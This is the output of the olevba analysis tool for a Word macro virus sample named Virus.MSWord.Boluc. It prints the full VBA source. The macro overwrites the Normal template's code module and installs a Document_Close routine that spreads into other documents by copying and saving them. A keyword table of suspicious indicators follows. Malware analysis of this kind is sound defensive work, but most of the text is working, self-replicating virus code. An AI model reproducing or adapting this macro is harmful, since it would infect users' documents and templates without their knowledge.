olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Boluc-29341dd6e983cbe7983707133930c59608f4551a
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Boluc-29341dd6e983cbe7983707133930c59608f4551a 
in file: Virus.MSWord.Boluc-29341dd6e983cbe7983707133930c59608f4551a - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim jui
Dim oWord
On Error Resume Next
Set oWord = CreateObject("Word.Application")
Set jui = oWord.NormalTemplate.VBProject.VBComponents.Item(1)
nlines = jui.CodeModule.CountOfLines
jui.CodeModule.DeleteLines 1, nlines
jui.Name = "Hercolubus"
jui.codemodule.InsertLines 1, "Sub Document_Close()"
jui.codemodule.InsertLines 2, "On Error Resume Next"
jui.codemodule.InsertLines 3, "Application.ScreenUpdating = False"
jui.codemodule.InsertLines 4, "nDoc = ActiveDocument.FullName"
jui.codemodule.InsertLines 5, "If nDoc <> " + Chr(34) +"C:\Microsof.doc" + Chr(34) + " Then"
jui.codemodule.InsertLines 6, "Nam = ActiveDocument.Name"
jui.codemodule.InsertLines 7, "nNam = Len(Nam)"
jui.codemodule.InsertLines 8, "If Right(Nam, 3) = " + Chr(34) + "doc" + chr(34) + " Then"
jui.codemodule.InsertLines 9, "sEo = Left(Nam, nNam - 4)"
jui.codemodule.InsertLines 10, "PostN = ActiveDocument.VBProject.VBComponents.count"
jui.codemodule.InsertLines 11, "For j = 1 To PostN"
jui.codemodule.InsertLines 12, "Set Pert = ActiveDocument.VBProject.VBComponents.Item(j)"
jui.codemodule.InsertLines 13, "If Pert.Name = " + Chr(34) +"Hercolubus" + Chr(34) + " Then"
jui.codemodule.InsertLines 14, "Exit For"
jui.codemodule.InsertLines 15, "Else"
jui.codemodule.InsertLines 16, "If j = PostN Then"
jui.codemodule.InsertLines 17, "hn = " + Chr(34) +"c:\Archivos de programa\Microsoft Office\office\Microsoft.doc"+ chr(34)
jui.codemodule.InsertLines 18, "Documents.Open FileName:=(hn)"
jui.codemodule.InsertLines 19, "kh = Dir(hn)"
jui.codemodule.InsertLines 20, "nC = Len(kh)"
jui.codemodule.InsertLines 21, "sE = Left(kh, nC - 4)"
jui.codemodule.InsertLines 22, "Application.Windows(sEo).Activate"
jui.codemodule.InsertLines 23, "ActiveDocument.SaveAs Filename:=" + Chr(34) + "C:\Microsof.doc" + Chr(34)
jui.codemodule.InsertLines 24, "ActiveDocument.Select"
jui.codemodule.InsertLines 25, "Selection.Copy"
jui.codemodule.InsertLines 26, "Application.Windows(sE).Activate"
jui.codemodule.InsertLines 27, "Selection.Paste"
jui.codemodule.InsertLines 28, "ActiveDocument.SaveAs Filename:=nDoc"
jui.codemodule.InsertLines 29, "ScreenUpdating = True"
jui.codemodule.InsertLines 30, "ActiveDocument.Close"
jui.codemodule.InsertLines 31, "End If"
jui.codemodule.InsertLines 32, "End If"
jui.codemodule.InsertLines 33, "Next j"
jui.codemodule.InsertLines 34, "End If"
jui.codemodule.InsertLines 35, "End If"
jui.codemodule.InsertLines 36, "End Sub"
oWord.Quit
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

